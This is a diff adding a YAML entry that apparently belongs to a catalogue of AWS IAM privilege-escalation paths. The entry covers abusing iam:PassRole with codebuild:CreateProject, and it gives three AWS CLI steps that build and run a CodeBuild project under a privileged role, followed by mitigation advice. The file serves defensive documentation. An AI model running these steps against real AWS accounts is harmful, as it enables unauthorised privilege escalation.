@@ -1,0 +1,80 @@
+id: codebuild-001
+name: iam:PassRole + codebuild:CreateProject
+category: service-passrole
+services:
+- iam
+- codebuild
+description: A principal with `iam:PassRole` and `codebuild:CreateProject` can create a new CodeBuild project and attach an
+  existing IAM role to it. The build project can execute arbitrary code (via buildspec.yml) with the permissions of the attached
+  role, allowing the attacker to escalate privileges. The level of access gained depends on the permissions of the available
+  roles.
+prerequisites:
+  admin:
+  - A role must exist that trusts codebuild.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess)
+  lateral:
+  - A role must exist that trusts codebuild.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      aws codebuild create-project --name privesc-project \
+        --source type=NO_SOURCE,buildspec="version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity\n      - aws iam list-users" \
+        --artifacts type=NO_ARTIFACTS \
+        --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL \
+        --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE
+    description: Create a CodeBuild project with the privileged role and malicious buildspec
+  - step: 2
+    command: aws codebuild start-build --project-name privesc-project
+    description: Start the build to execute code with elevated privileges
+  - step: 3
+    command: aws codebuild batch-get-builds --ids $(aws codebuild list-builds-for-project --project-name privesc-project --query
+      'ids[0]' --output text)
+    description: Retrieve build logs containing the output of privileged commands
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "codebuild.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Restrict `codebuild:CreateProject` to specific project name patterns
+  - Require approval for buildspec content in source repositories
+  - Monitor CloudTrail for CodeBuild project creation with privileged roles
+  - Enable CodeBuild VPC configuration to restrict network access
+discoveredBy:
+  name: Spencer Gietzen
+  organization: Rhino Security Labs
+  date: '2019'
+references:
+- title: IAM Vulnerable - CodeBuild PassRole
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- ec2-001
+- lambda-001
+- cloudformation-001
+toolSupport:
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: codebuild:CreateProject
+    resourceConstraints: Must have permission to create CodeBuild projects
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
